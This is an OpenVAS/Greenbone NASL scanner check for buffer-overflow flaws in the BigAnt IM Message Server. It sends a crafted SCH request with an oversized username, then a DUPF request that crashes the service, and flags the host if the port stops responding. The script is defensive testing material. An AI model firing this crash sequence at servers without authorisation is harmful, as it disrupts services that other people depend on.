# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802051");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-6273", "CVE-2012-6274", "CVE-2012-6275");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-03-04 11:45:47 +0530 (Mon, 04 Mar 2013)");
  script_name("BigAntSoft BigAnt IM Message Server Multiple Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(6661);

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/990652");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57214");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/117864");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120404");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120405");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary
  code or can upload arbitrary files or manipulate SQL queries by injecting
  arbitrary SQL queries.");
  script_tag(name:"affected", value:"BigAnt Server version 2.97 SP7, Other versions may also be
  affected");
  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Improper validation of user input when handling the filename header
  in SCH requests or when handling the userid component in DUPF requests.

  - Not properly verify or sanitize user-uploaded files.

  - Not properly sanitizing user-supplied input to the 'Account/Full Name'
  field when performing an Account/Full Name user search.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"BigAntSoft BigAnt IM Message Server is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

port = 6661;
if( ! get_port_state( port ) ) exit( 0 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

## Common SCH request
common_req = string ("SCH 16", '\x0a',
                     "cmdid: 1", '\x0a',
                     "content-length: 0", '\x0a',
                     "content-type: Application/Download", '\x0a',
                     "filename: Uujj.txt", '\x0a',
                     "modified: 1248-21-32 08:13:01", '\x0a',
                     "pclassid: 102", '\x0a',
                     "pobjid: 1", '\x0a',
                     "rootid: 1", '\x0a',
                     "sendcheck: 1", '\x0a',
                     "source_cmdname: DUPF", '\x0a',
                     "source_content-length: 116619", '\x0a',
                     "userid: 5", '\x0a');
normal_req = string(common_req, "username: bstest", '\x0a','\x0a');

## Send normal request to confirm the application
## with specific response
send(socket:soc, data:normal_req);
normal_res = recv(socket:soc, length:1024);

if("SCH 1" >!< normal_res || "scmderid:" >!< normal_res){
  close(soc);
  exit(0);
}

## Send crafted SCH request with big username
bof = crap(length:1000, data:"A");
attack_req1 = string(common_req , "username: ", bof, '\x0a','\x0a');
send(socket:soc, data:attack_req1);
attack_res1 = recv(socket:soc, length:1024);

## Extract scmderid from the response
scmderid = eregmatch(pattern:"scmderid: (\{.*\})",string:attack_res1);
if(isnull(scmderid)){
  close(soc);
  exit(0);
}


## Send crafted DUPF request to trigger the BoF
attack_req2 = string("DUPF 16", '\x0a',
                     "cmdid: 1", '\x0a',
                     "content-length: 14", '\x0a',
                     "content-type: Application/Download", '\x0a',
                     "filename: Uujj.txt", '\x0a',
                     "modified: 1248-21-32 08:13:01", '\x0a',
                     "pclassid: 102", '\x0a',
                     "pobjid: 1", '\x0a',
                     "rootid: 1", '\x0a',
                     "scmderid: ", scmderid[1], '\x0a',
                     "sendcheck: 1", '\x0a',
                     "userid: 5", '\x0a',
                     "username: xmcjm", '\x0a', '\x0a',
                     "KiLTTSQlSwtmiY");

send(socket:soc, data:attack_req2);
attack_res2 = recv(socket:soc, length:1024);

close(soc);

sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2){
  security_message(port);
  exit(0);
}

close(soc2);
